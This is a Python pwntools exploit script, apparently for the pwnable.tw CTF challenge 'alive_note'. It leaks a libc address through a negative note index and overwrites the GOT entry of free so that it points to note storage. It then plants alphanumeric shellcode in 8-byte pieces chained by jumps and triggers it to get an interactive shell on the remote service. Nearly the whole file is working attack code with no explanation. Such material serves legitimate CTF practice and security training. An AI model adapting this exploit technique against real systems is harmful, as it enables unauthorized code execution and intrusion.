#!/usr/bin/env python3
from pwn import *
import signal

context.log_level = 'debug'

signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))

libc = ELF('./lib/libc.so.6')
elf = ELF('./alive_note')
p = None
local = False

alph = [0x20]

for i in range(0x30, 0x40):
	alph.append(i)

for i in range(0x41, 0x5b):
	alph.append(i)

for i in range(0x61, 0x7b):
	alph.append(i)

def add(idx, name):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Index :', str(idx).encode())	
	p.sendlineafter(b'Name :', name)

def show(idx):	
	p.sendlineafter(b'Your choice :', b'2')
	p.sendlineafter(b'Index :', str(idx).encode())

def _del(idx):
	p.sendlineafter(b'Your choice :', b'3')
	p.sendlineafter(b'Index :', str(idx).encode())

def put_dummy(n):
	for i in range(n):
		add(b'0', b'')

def put_sh(sh, targ=0, n=3):
	add(targ, sh)
	put_dummy(n)

def s_sh(sh, targ=0):
	add(targ, sh)

while True:
	try:
		if local:
			p = process('./alive_note')

			gdb.attach(p, '''
				b *0x080488e9
				c
				call (int)mprotect(0x0804b000, 0x2000, 0x7)
			''')
		else:
			p = remote('chall.pwnable.tw', 10300)

		show(-8)
		p.recv(11)
		libc.address = u32(p.recv(4)) - 0x1b05e7
		print(hex(libc.sym['system']))

		target = (elf.got['free'] - elf.sym['note']) // 4

		sh1 = b'\x52\x68\x5a\x5a\x73\x68\x75\x38'
		sh2 = b'\x68\x5a\x62\x69\x6e\x54\x75\x38'
		sh3 = b'\x59\x51\x51\x43\x43\x43\x75\x38'
		sh4 = b'\x43' * 6 + b'\x75\x38'
		sh5 = b'\x49\x49\x49\x49\x49\x49\x75\x38'
		sh6 = b'\x52\x52\x52\x43\x4b\x75\x39'
		sh7 = b'\x49' * 6 + b'\x75\x38'
		sh8 = b'\x49\x49\x49\x30\x59\x20\x75\x38'
		sh9 = b'\x49\x30\x59\x20\x49\x49\x75\x38'
		sha = b'\x49\x49\x30\x59\x20\x49\x75\x38'
		shb = b'\x49' * 6 + b'\x75\x38'
		shc = b'\x4b' * 6 + b'\x75\x38'
		shd = b'\x4b' * 4 + b'\x49' + b'\x75\x39'
		she = b'\x30\x59\x20\x41\x4b\x4b\x75\x38'
		shf = b'\x4b\x4b\x4b\x4b\x43\x75\x39'
		shg = b'\x30\x59\x20\x52\x49\x49\x75\x38'
		shh = b'\x49\x49\x49\x30\x59\x20\x75\x38'
		shi = b'\x4b\x41\x41\x41\x41\x41\x75\x38'
		shj = b'\x41\x41\x41\x30\x59\x20\x75\x38'
		shk = b'\x52\x59' * 3 + b'\x75\x38'

		fs1 = b'\x5a\x30\x50\x72\x51\x5a\x4a\x52'
		fs2 = b'\x5a\x4b\x66\x31\x50\x73\x5a\x52'
		fs3 = b'\x5a\x66\x31\x50\x73\x52\x5a\x52'
		fs4 = b'\x5a\x51\x5a\x75\x39' + b'\x61'
		fs5 = b'\x61' * 8
		fs6 = b'\x58\x5a\x6b\x73\x4f'

		put_sh(sh1, target)
		put_sh(sh2)
		put_sh(sh3)

		for i in range(19):
			put_sh(sh4)
			
		put_sh(sh5)
		put_sh(sh6)

		for i in range(3):
			put_sh(sh7)

		put_sh(sh8)
		put_sh(sh9)
		put_sh(sha)

		for i in range(2):
			put_sh(sh7)

		put_sh(shb)

		for i in range(8):
			put_sh(shc)

		put_sh(shd)
		put_sh(she)

		for i in range(2):
			put_sh(shc)

		put_sh(shf)
		put_sh(shg)
		put_sh(shh)

		for i in range(6):
			put_sh(shc)

		put_sh(shi)
		put_sh(shj)
		put_sh(shk)

		s_sh(fs1, 1)
		s_sh(fs2)
		s_sh(fs3)
		s_sh(fs4)

		for i in range(3):
			s_sh(fs5)

		s_sh(fs6)

		_del(1)

		p.interactive()
	except (Exception, EOFError) as e:
		print(e)
		
		if p: 
			p.close()
